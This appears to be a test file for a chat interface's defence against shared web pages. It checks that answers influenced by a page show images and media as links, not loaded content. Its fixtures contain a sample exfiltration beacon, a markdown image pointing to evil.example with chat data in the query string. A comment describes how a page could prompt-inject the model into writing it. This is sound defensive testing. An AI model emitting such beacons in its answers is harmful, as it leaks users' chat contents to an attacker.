import { describe, expect, it } from "vitest";

import { attachmentMessage, readAttachmentMessage } from "./chatAttachments";
import { buildImageMessage } from "./chatImage";
import {
  AUDIO_MESSAGE_PREFIX,
  IMAGE_PENDING_MARKER,
  SPEECH_MESSAGE_PREFIX,
  SPEECH_PENDING_MARKER,
  VIDEO_PENDING_MARKER,
} from "./chatMarkers";
import {
  extractMarkdownImage,
  readAudioMessage,
  readImageMessage,
  readSpeechMessage,
  readVideoMessage,
} from "./chatPanelMessages";
import { buildVideoMessage } from "./chatVideo";
import {
  answerImages,
  mediaContent,
  readSharedPages,
  sharedPagesLabel,
  sharedPagesNote,
  withSharedPageMarks,
  type SharedPages,
} from "./sharedPages";

describe("the server's mark on an answer built from shared pages", () => {
  it("is read with its sites", () => {
    expect(readSharedPages({ sites: ["docs.example.com", "intranet"] })).toEqual({
      sites: ["docs.example.com", "intranet"],
      inherited: false,
    });
  });

  it("says when the answer only follows a shared page in the same chat", () => {
    expect(readSharedPages({ sites: ["docs.example.com"], inherited: true })).toEqual({
      sites: ["docs.example.com"],
      inherited: true,
    });
    expect(readSharedPages({ sites: [], inherited: "yes" })?.inherited).toBe(false);
  });

  it("still counts when its sites are missing or unusable: the protection never hinges on them", () => {
    expect(readSharedPages({})).toEqual({ sites: [], inherited: false });
    expect(readSharedPages({ sites: [42, "", "x".repeat(300), "ok.example"] })?.sites).toEqual(["ok.example"]);
  });

  it.each(["docs.example.com", 1, 0, false, true, "", ["docs.example.com"]])(
    "still counts when it is %j: anything the server sent is a mark",
    (value) => {
      expect(readSharedPages(value)).toEqual({ sites: [], inherited: false });
    },
  );

  it("keeps at most twenty sites", () => {
    const sites = Array.from({ length: 25 }, (_, i) => `s${i}.example`);
    expect(readSharedPages({ sites })?.sites).toHaveLength(20);
  });

  it.each([undefined, null])("is absent for %j", (value) => {
    expect(readSharedPages(value)).toBeUndefined();
  });
});

describe("how the chat shows such an answer", () => {
  it("never loads its images", () => {
    expect(answerImages({ pageContext: { sites: ["docs.example.com"], inherited: false } })).toBe("link");
    expect(answerImages({ pageContext: { sites: [], inherited: true } })).toBe("link");
    expect(answerImages({})).toBe("load");
  });

  it.each([
    [[], "From a shared page"],
    [["docs.example.com"], "From a page on docs.example.com"],
    [["a.example", "b.example"], "From pages on a.example and b.example"],
    [["a.example", "b.example", "c.example"], "From pages on a.example and 2 other sites"],
  ])("labels %j as %s", (sites, label) => {
    expect(sharedPagesLabel({ sites, inherited: false })).toBe(label);
  });

  it.each([
    [[], "In a chat with a shared page"],
    [["docs.example.com"], "In a chat with a page from docs.example.com"],
    [["a.example", "b.example"], "In a chat with pages from a.example and b.example"],
    [["a.example", "b.example", "c.example"], "In a chat with pages from a.example and 2 other sites"],
  ])("labels a later answer in a chat with %j as %s", (sites, label) => {
    expect(sharedPagesLabel({ sites, inherited: true })).toBe(label);
  });

  it("explains why its images are links", () => {
    expect(sharedPagesNote({ sites: ["a.example"], inherited: false })).toMatch(/^Built from a page .* shown as links/);
    expect(sharedPagesNote({ sites: ["a.example"], inherited: true })).toMatch(/^An earlier answer in this chat .* shown as links/);
  });
});

describe("an answer that follows one built from shared pages", () => {
  type Message = { role: "user" | "assistant"; content: string; pageContext?: SharedPages };
  const fromPage: SharedPages = { sites: ["docs.example.com"], inherited: false };
  const beacon = "![chart](https://evil.example/pixel.png?chat=secret)";

  /** A chat with an answer about a page (unless `mark` is null), then a follow-up the server has not marked yet. */
  function chatWith(followUp: string, mark: SharedPages | null = fromPage): Message[] {
    return [
      { role: "user", content: "Summarize the page" },
      { role: "assistant", content: "The page says to open the chart.", ...(mark ? { pageContext: mark } : {}) },
      { role: "user", content: "Show me the chart" },
      { role: "assistant", content: followUp },
    ];
  }

  it("is marked as one from its placeholder on, before the server's mark arrives", () => {
    const placeholder = withSharedPageMarks(chatWith(""));
    expect(placeholder[3].pageContext).toEqual({ sites: ["docs.example.com"], inherited: true });
    const streaming = withSharedPageMarks(chatWith(`Here it is: ${beacon}`));
    expect(streaming[3].pageContext).toEqual({ sites: ["docs.example.com"], inherited: true });
    expect(sharedPagesLabel(streaming[3].pageContext!)).toBe("In a chat with a page from docs.example.com");
  });

  it("shows its images as links while it streams, and none of its media markers as media", () => {
    expect(answerImages(withSharedPageMarks(chatWith(`Here it is: ${beacon}`))[3])).toBe("link");
    const image = buildImageMessage({ url: "https://evil.example/x.png?chat=secret", prompt: "", model: "m" });
    expect(readImageMessage(mediaContent(withSharedPageMarks(chatWith(image))[3]))).toBeNull();
    expect(mediaContent(withSharedPageMarks(chatWith(IMAGE_PENDING_MARKER))[3])).toBe("");
  });

  it("leaves the questions, and the answers before the first page, as they are", () => {
    const chat: Message[] = [
      { role: "user", content: "Hello" },
      { role: "assistant", content: `Hi ${beacon}` },
      ...chatWith("More"),
    ];
    const marked = withSharedPageMarks(chat);
    expect(marked.slice(0, 5)).toEqual(chat.slice(0, 5));
    expect(marked[1]).toBe(chat[1]);
    expect(answerImages(marked[1])).toBe("load");
    expect(marked[4].pageContext).toBeUndefined();
    expect(marked[5].pageContext).toEqual({ sites: ["docs.example.com"], inherited: true });
  });

  it("keeps an answer's own mark, and carries the sites of every answer from a page", () => {
    const serverMarked: Message = { role: "assistant", content: "Marked", pageContext: { sites: [], inherited: true } };
    const chat: Message[] = [
      { role: "user", content: "Summarize the page" },
      { role: "assistant", content: "From a page", pageContext: fromPage },
      { role: "user", content: "And this one?" },
      { role: "assistant", content: "Also from a page", pageContext: { sites: ["wiki.example", "docs.example.com"], inherited: false } },
      serverMarked,
      { role: "user", content: "And?" },
      { role: "assistant", content: "Not marked yet" },
    ];
    const marked = withSharedPageMarks(chat);
    expect(marked[4]).toBe(serverMarked);
    expect(marked[6].pageContext).toEqual({ sites: ["docs.example.com", "wiki.example"], inherited: true });
  });

  it("counts a mark without sites", () => {
    expect(withSharedPageMarks(chatWith("Later", { sites: [], inherited: false }))[3].pageContext).toEqual({
      sites: [],
      inherited: true,
    });
  });

  it("changes nothing in a chat without shared pages, whose images still load", () => {
    const chat = chatWith(`Here it is: ${beacon}`, null);
    expect(withSharedPageMarks(chat)).toBe(chat);
    expect(answerImages(withSharedPageMarks(chat)[3])).toBe("load");
    const image = buildImageMessage({ url: "/api/chat/media/7/file", prompt: "a cat", model: "m" });
    expect(readImageMessage(mediaContent(withSharedPageMarks(chatWith(image, null))[3]))).toBeTruthy();
  });
});

describe("the chat's own media messages", () => {
  const marked = { sites: ["evil.example"], inherited: false };
  const beacon = "https://evil.example/pixel.png?chat=secret";

  // Each is something a page could tell the model to write, and each would
  // make the chat load an address of the page's choosing.
  const cases: Array<[string, string, (content: string) => unknown]> = [
    ["a generated image", buildImageMessage({ url: beacon, prompt: "", model: "m" }), readImageMessage],
    ["a generated video", buildVideoMessage({ url: beacon, prompt: "", model: "m" }), readVideoMessage],
    ["generated speech", `${SPEECH_MESSAGE_PREFIX}${JSON.stringify({ url: beacon, prompt: "", model: "m" })}`, readSpeechMessage],
    [
      "an attachment",
      attachmentMessage({ userText: "", attachments: [{ kind: "image", name: "x.png", mime_type: "image/png", url: beacon }] }),
      readAttachmentMessage,
    ],
    ["a recording", `${AUDIO_MESSAGE_PREFIX}${JSON.stringify({ url: beacon, transcript: "" })}`, readAudioMessage],
    ["a markdown image on its own", `![x](${beacon})`, (content) => extractMarkdownImage(content).imageUrl],
  ];

  it.each(cases)("are read from an ordinary answer: %s", (_name, content, read) => {
    expect(read(mediaContent({ content }))).toBeTruthy();
  });

  it.each(cases)("are never read from an answer built from a shared page: %s", (_name, content, read) => {
    expect(read(mediaContent({ content, pageContext: marked }))).toBeFalsy();
    expect(read(mediaContent({ content, pageContext: { sites: [], inherited: true } }))).toBeFalsy();
  });

  it.each([IMAGE_PENDING_MARKER, VIDEO_PENDING_MARKER, SPEECH_PENDING_MARKER])(
    "never show a shared page's answer as media still being made: %s",
    (marker) => {
      expect(mediaContent({ content: marker })).toBe(marker);
      expect(mediaContent({ content: marker, pageContext: marked })).toBe("");
    },
  );
});
